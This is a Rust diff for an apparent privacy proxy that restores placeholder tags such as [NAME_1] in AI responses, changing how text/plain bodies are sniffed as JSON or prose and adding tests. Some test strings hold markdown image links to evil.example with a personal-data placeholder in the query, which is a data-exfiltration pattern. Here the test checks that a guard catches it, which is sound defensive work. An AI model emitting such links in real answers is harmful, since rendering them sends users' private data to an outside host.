@@ -11,7 +11,10 @@
 //!   restored and the document re-serialised; `)]}'`-prefixed JSON-in-text
 //!   (Gemini) line by line; larger documents through the JSON fragment
 //!   restorer. A body that is not JSON passes through.
-//! - `text/plain`: one stream restorer.
+//! - `text/plain`: one stream restorer, unless the body starts like JSON
+//!   (up to a string or an object, or a JSON value followed by another on a
+//!   later line): then it is restored as `application/json` is, or passes
+//!   through, never as text.
 //! - Anything else (HTML included) passes through untouched: AI sites
 //!   render answers from JSON and event streams, where values are text.
 //!
@@ -121,13 +124,7 @@ fn build(
         | "application/x-jsonlines"
         | "application/stream+json" => Box::new(NdjsonRestore::new(engine, scope, cap)),
         m if m == "application/json" || m == "text/json" || m.ends_with("+json") => {
-            Box::new(JsonRestore {
-                engine: engine.clone(),
-                scope: scope.to_string(),
-                cap,
-                documents,
-                mode: JsonMode::Buffer(Vec::new(), TopLevel::default()),
-            })
+            Box::new(JsonRestore::new(engine, scope, cap, documents))
         }
         "text/plain" if documents => Box::new(PlainRestore {
             engine: engine.clone(),
@@ -263,21 +260,122 @@ impl StreamTransform for TextStream {
 }
 
 enum PlainMode {
-    /// Nothing but whitespace yet.
+    /// Not decided yet (leading whitespace, or the start of what may be
+    /// JSON).
     Sniff(Vec<u8>),
-    /// Starts like a JSON document: buffered until the end.
-    Buffer(Vec<u8>),
     Text(TextStream),
+    /// Starts like JSON: restored as one document or as JSON lines, or
+    /// passed through, never as text.
+    Json(JsonRestore),
     /// Too large to buffer: passed through.
     Raw,
 }
 
-/// `text/plain`: text, unless it is a JSON document (sites serve JSON as
-/// text/plain too), which is restored as one.
+/// The longest start of a text/plain answer read to decide whether it is
+/// JSON; past it, a start that is still JSON so far counts as JSON.
+const SNIFF_MAX: usize = 1024;
+
+/// What a text/plain answer is, from its start.
+#[derive(Debug, PartialEq, Eq)]
+enum PlainKind {
+    Text,
+    Json,
+    /// Only whitespace, at the end.
+    Blank,
+}
+
+/// Decide what `buf` (the start of a text/plain answer; all of it when
+/// `end`) is, or `None` to wait for more. JSON is a start that reads as
+/// JSON up to a string or an object (`{"`, `["`, `[{`), a JSON string
+/// literal on its own, or a JSON value followed by another on a later line;
+/// anything that stops being JSON before that is text (`[NAME_1] said`,
+/// `[1] see`, `"Hi" said`).
+fn sniff_plain(buf: &[u8], end: bool) -> Option<PlainKind> {
+    let body = buf.strip_prefix(b"\xEF\xBB\xBF").unwrap_or(buf);
+    let lead = body.iter().take_while(|b| b.is_ascii_whitespace()).count();
+    let rest = &body[lead..];
+    let t = match std::str::from_utf8(rest) {
+        Ok(t) => t,
+        Err(e) if e.error_len().is_none() => {
+            std::str::from_utf8(&rest[..e.valid_up_to()]).unwrap_or("")
+        }
+        Err(_) => return Some(PlainKind::Text),
+    };
+    let more = |t: &str| (end || t.len() > SNIFF_MAX).then_some(PlainKind::Json);
+    match t.chars().next() {
+        None if end => Some(PlainKind::Blank),
+        None => None,
+        Some('{' | '[') => match json_start(t) {
+            JsonStart::Clear | JsonStart::Broken => Some(PlainKind::Json),
+            JsonStart::Open => more(t),
+            JsonStart::Not => Some(PlainKind::Text),
+            JsonStart::Closed(at) => after_value(&t[at..]).or_else(|| more(t)),
+        },
+        Some('"') => match string_end(t) {
+            Some(at) => after_value(&t[at..]).or_else(|| more(t)),
+            None => more(t),
+        },
+        Some(_) => Some(PlainKind::Text),
+    }
+}
+
+/// After a complete JSON value: another value on a later line makes JSON
+/// lines, other text makes it all text; `None` while only whitespace
+/// follows.
+fn after_value(rest: &str) -> Option<PlainKind> {
+    let ws = rest.len() - rest.trim_start().len();
+    match rest[ws..].chars().next() {
+        None => None,
+        Some('{' | '[' | '"') if rest[..ws].contains('\n') => Some(PlainKind::Json),
+        Some(_) => Some(PlainKind::Text),
+    }
+}
+
+/// Where the JSON string literal `t` starts with ends (after its closing
+/// quote), if it does.
+fn string_end(t: &str) -> Option<usize> {
+    let b = t.as_bytes();
+    let mut i = 1;
+    while i < b.len() {
+        match b[i] {
+            b'\\' => i += 2,
+            b'"' => return Some(i + 1),
+            _ => i += 1,
+        }
+    }
+    None
+}
+
+/// `text/plain`: text, unless it starts like JSON (sites serve JSON as
+/// text/plain too), which is restored as JSON or passes through.
 struct PlainRestore {
     engine: Engine,
     scope: String,
     mode: PlainMode,
+}
+
+impl PlainRestore {
+    /// Leave sniffing as `kind`, sending what was held.
+    fn decide(&mut self, kind: PlainKind, held: Vec<u8>) -> Vec<u8> {
+        match kind {
+            PlainKind::Blank => {
+                self.mode = PlainMode::Raw;
+                held
+            }
+            PlainKind::Text => {
+                let mut t = TextStream::new(TextRestorer::plain(&self.engine, &self.scope));
+                let out = t.push_bytes(&held);
+                self.mode = PlainMode::Text(t);
+                out
+            }
+            PlainKind::Json => {
+                let mut j = JsonRestore::new(&self.engine, &self.scope, MAX_ITEM_BYTES, true);
+                let out = j.push(&held).to_vec();
+                self.mode = PlainMode::Json(j);
+                out
+            }
+        }
+    }
 }
 
 impl StreamTransform for PlainRestore {
@@ -285,41 +383,17 @@ impl StreamTransform for PlainRestore {
         match &mut self.mode {
             PlainMode::Raw => Bytes::copy_from_slice(chunk),
             PlainMode::Text(t) => Bytes::from(t.push_bytes(chunk)),
-            PlainMode::Buffer(buf) => {
-                buf.extend_from_slice(chunk);
-                if buf.len() <= MAX_JSON_BUFFER {
-                    return Bytes::new();
-                }
-                let out = std::mem::take(buf);
-                self.mode = PlainMode::Raw;
-                Bytes::from(out)
-            }
+            PlainMode::Json(j) => j.push(chunk),
             PlainMode::Sniff(buf) => {
-                // What is held is whitespace: only the new bytes are read.
-                let first = chunk
-                    .iter()
-                    .find(|b| !b.is_ascii_whitespace() && !b"\xef\xbb\xbf".contains(b));
                 buf.extend_from_slice(chunk);
-                match first {
-                    None if buf.len() > MAX_JSON_BUFFER => {
-                        let out = std::mem::take(buf);
-                        self.mode = PlainMode::Raw;
-                        Bytes::from(out)
-                    }
-                    None => Bytes::new(),
-                    Some(b'{' | b'[') => {
-                        let held = std::mem::take(buf);
-                        self.mode = PlainMode::Buffer(Vec::new());
-                        self.push(&held)
-                    }
-                    Some(_) => {
-                        let held = std::mem::take(buf);
-                        let mut t = TextStream::new(TextRestorer::plain(&self.engine, &self.scope));
-                        let out = t.push_bytes(&held);
-                        self.mode = PlainMode::Text(t);
-                        Bytes::from(out)
-                    }
-                }
+                let kind = match sniff_plain(buf, false) {
+                    Some(kind) => kind,
+                    // Only whitespace, more than a document can be.
+                    None if buf.len() > MAX_JSON_BUFFER => PlainKind::Blank,
+                    None => return Bytes::new(),
+                };
+                let held = std::mem::take(buf);
+                Bytes::from(self.decide(kind, held))
             }
         }
     }
@@ -327,19 +401,14 @@ impl StreamTransform for PlainRestore {
     fn finish(&mut self) -> Bytes {
         match std::mem::replace(&mut self.mode, PlainMode::Raw) {
             PlainMode::Raw => Bytes::new(),
-            PlainMode::Sniff(buf) => Bytes::from(buf),
             PlainMode::Text(mut t) => Bytes::from(t.finish_bytes()),
-            PlainMode::Buffer(buf) => match parda_wire::body::parse_json(&buf) {
-                Ok(v) => Bytes::from(
-                    restore_json_value(&self.engine, &self.scope, &buf, v).unwrap_or(buf),
-                ),
-                Err(_) => {
-                    let mut t = TextStream::new(TextRestorer::plain(&self.engine, &self.scope));
-                    let mut out = t.push_bytes(&buf);
-                    out.extend(t.finish_bytes());
-                    Bytes::from(out)
-                }
-            },
+            PlainMode::Json(mut j) => j.finish(),
+            PlainMode::Sniff(buf) => {
+                let kind = sniff_plain(&buf, true).unwrap_or(PlainKind::Blank);
+                let mut out = self.decide(kind, buf);
+                out.extend_from_slice(&self.finish());
+                Bytes::from(out)
+            }
         }
     }
 }
@@ -432,6 +501,18 @@ struct JsonRestore {
     /// Google frames) passes through as it came.
     documents: bool,
     mode: JsonMode,
+}
+
+impl JsonRestore {
+    fn new(engine: &Engine, scope: &str, cap: usize, documents: bool) -> Self {
+        JsonRestore {
+            engine: engine.clone(),
+            scope: scope.to_string(),
+            cap,
+            documents,
+            mode: JsonMode::Buffer(Vec::new(), TopLevel::default()),
+        }
+    }
 }
 
 impl StreamTransform for JsonRestore {
@@ -1144,10 +1225,24 @@ fn is_patch_event(v: &Value) -> bool {
     })
 }
 
-/// Is `text` the start of a JSON object or array that is not finished yet
-/// (`{"q": "x`, `[1, "a`)? Text that merely starts with a bracket
-/// (`[NAME_1] said`, `[1] see`) is not.
-fn is_json_prefix(text: &str) -> bool {
+/// How text starts, read as JSON.
+#[derive(Debug, PartialEq, Eq)]
+enum JsonStart {
+    /// An unfinished object or array that has reached a string or an
+    /// object (`{"`, `["`, `[1, {`): JSON text.
+    Clear,
+    /// An unfinished object or array, nothing telling yet (`[`, `[1, 2`).
+    Open,
+    /// A complete object or array ending at this byte offset (`[1]`).
+    Closed(usize),
+    /// Not JSON (`[NAME_1]`, `[1] see`, prose).
+    Not,
+    /// Clearly JSON, then not valid (`["a", ]`, `{"v": NaN}`).
+    Broken,
+}
+
+/// Read the start of `text` as JSON (see [`JsonStart`]).
+fn json_start(text: &str) -> JsonStart {
     #[derive(PartialEq)]
     enum Expect {
         Value,
@@ -1160,12 +1255,20 @@ fn is_json_prefix(text: &str) -> bool {
         /// A value or the end of an array.
         ValueOrEnd,
     }
+    let invalid = |clear| {
+        if clear {
+            JsonStart::Broken
+        } else {
+            JsonStart::Not
+        }
+    };
     let b = text.as_bytes();
     if !matches!(b.first(), Some(b'{' | b'[')) {
-        return false;
+        return JsonStart::Not;
     }
     let mut stack: Vec<u8> = Vec::new();
     let mut expect = Expect::Value;
+    let mut clear = false;
     let mut i = 0;
     while i < b.len() {
         let c = b[i];
@@ -1176,6 +1279,7 @@ fn is_json_prefix(text: &str) -> bool {
         let value_start = matches!(expect, Expect::Value | Expect::ValueOrEnd);
         match c {
             b'{' | b'[' if value_start => {
+                clear |= c == b'{' && !stack.is_empty();
                 stack.push(c);
                 expect = if c == b'{' {
                     Expect::KeyOrEnd
@@ -1211,11 +1315,12 @@ fn is_json_prefix(text: &str) -> bool {
                 i += 1;
             }
             b'"' if value_start || matches!(expect, Expect::KeyOrEnd | Expect::Key) => {
+                clear = true;
                 let key = matches!(expect, Expect::KeyOrEnd | Expect::Key);
                 i += 1;
                 loop {
                     match b.get(i) {
-                        None => return true,
+                        None => return JsonStart::Clear,
                         Some(b'\\') => i += 2,
                         Some(b'"') => break,
                         Some(_) => i += 1,
@@ -1244,19 +1349,29 @@ fn is_json_prefix(text: &str) -> bool {
                 let rest = &b[i..];
                 let n = rest.len().min(word.len());
                 if rest[..n] != word[..n] {
-                    return false;
+                    return invalid(clear);
                 }
                 i += n;
                 expect = Expect::CommaOrEnd;
             }
-            _ => return false,
+            _ => return invalid(clear),
         }
         if stack.is_empty() {
-            // A complete document (more after it is not JSON text).
-            return false;
+            return JsonStart::Closed(i);
         }
     }
-    true
+    if clear {
+        JsonStart::Clear
+    } else {
+        JsonStart::Open
+    }
+}
+
+/// Is `text` the start of a JSON object or array that is not finished yet
+/// (`{"q": "x`, `[1, "a`)? Text that merely starts with a bracket
+/// (`[NAME_1] said`, `[1] see`) is not.
+fn is_json_prefix(text: &str) -> bool {
+    matches!(json_start(text), JsonStart::Clear | JsonStart::Open)
 }
 
 /// Does `text` (after a BOM and whitespace) start like a JSON object, array
@@ -2295,6 +2410,83 @@ mod tests {
             "text/plain",
         ] {
             assert!(!for_content_type(&e, SCOPE, ct).is_passthrough(), "{ct}");
+        }
+    }
+
+    /// Review findings (text/plain answers): a body that looks like JSON is
+    /// restored as JSON (one document, or NDJSON lines) or passes through,
+    /// never as text; prose that merely starts with a bracket streams.
+    #[test]
+    fn text_plain_answers_are_json_or_text_never_both() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        let q = quoted_tag(&e);
+        let ndjson = format!(
+            "{}\n{}\n",
+            json!({"t": format!("at {q}")}),
+            json!({"t": "bye"})
+        );
+        let pointy = "{\"t\":\"![x](\\u003c//evil.example/?d= [NAME_1]\\u003e)\"}\n{\"t\":\"x\"}\n";
+        let literal = "\"![x](\\u003c//evil.example/?d= [NAME_1]\\u003e) [EMAIL_1]\"";
+        for n in [1, 3, 7, 1000] {
+            let out = String::from_utf8(run(&e, "text/plain", ndjson.as_bytes(), n)).unwrap();
+            let lines: Vec<Value> = out
+                .lines()
+                .map(|l| serde_json::from_str(l).unwrap_or_else(|err| panic!("{err}: {out:?}")))
+                .collect();
+            assert_eq!(lines[0]["t"], format!("at {QUOTED}"));
+            assert_eq!(lines[1]["t"], "bye");
+            // `<` escaped as Go and .NET encoders do: the guard reads the
+            // decoded text, a pointy destination keeps its tag.
+            let out = String::from_utf8(run(&e, "text/plain", pointy.as_bytes(), n)).unwrap();
+            let first: Value = serde_json::from_str(out.lines().next().unwrap()).unwrap();
+            assert_eq!(first["t"], "![x](<//evil.example/?d= [NAME_1]>)");
+            let out = run(&e, "text/plain", literal.as_bytes(), n);
+            let v: Value = serde_json::from_slice(&out).unwrap();
+            assert_eq!(
+                v, "![x](<//evil.example/?d= [NAME_1]>) ravi@example.com",
+                "{n}"
+            );
+            // JSON-looking but neither a document nor JSON lines: as it came.
+            for raw in [
+                format!("{{\"t\":\"at {q}\"}}\n{{oops\n"),
+                format!("[\"{q}\", ]"),
+                format!("\"{q}"),
+            ] {
+                let out = String::from_utf8(run(&e, "text/plain", raw.as_bytes(), n)).unwrap();
+                assert!(!out.contains("Lotus") || out.lines().all(|l| l.contains("oops") || serde_json::from_str::<Value>(l).is_ok()), "{raw:?} -> {out:?}");
+                assert!(!out.contains(QUOTED), "{raw:?} -> {out:?}");
+            }
+        }
+        // Prose starting with a tag or a bracket is text, restored as it
+        // streams.
+        let mut t = for_content_type(&e, SCOPE, "text/plain");
+        let outs: Vec<Bytes> = ["[", "NAME_1] said hello", " and more"]
+            .iter()
+            .map(|c| t.push(c.as_bytes()))
+            .collect();
+        assert!(outs[1].starts_with(b"Ravi Kumar said"), "{outs:?}");
+        assert_eq!(outs[2], " and more");
+        assert!(t.finish().is_empty());
+        for (text, start) in [
+            ("[", JsonStart::Open),
+            ("[1, 2", JsonStart::Open),
+            ("{\"", JsonStart::Clear),
+            ("[1, {", JsonStart::Clear),
+            ("[[\"a\"", JsonStart::Clear),
+            ("[1] see", JsonStart::Closed(3)),
+            ("[NAME_1]", JsonStart::Not),
+            ("[1, 2] or [", JsonStart::Closed(6)),
+            ("[\"a\", ]", JsonStart::Broken),
+            ("{\"v\": NaN}", JsonStart::Broken),
+        ] {
+            assert_eq!(json_start(text), start, "{text}");
+        }
+        for body in ["[1] see [NAME_1]", "{x} [NAME_1]", "\"Hi\" said [NAME_1]"] {
+            for n in [1, 2, 5] {
+                let out = String::from_utf8(run(&e, "text/plain", body.as_bytes(), n)).unwrap();
+                assert_eq!(out, body.replace("[NAME_1]", "Ravi Kumar"), "{body:?} {n}");
+            }
         }
     }
 
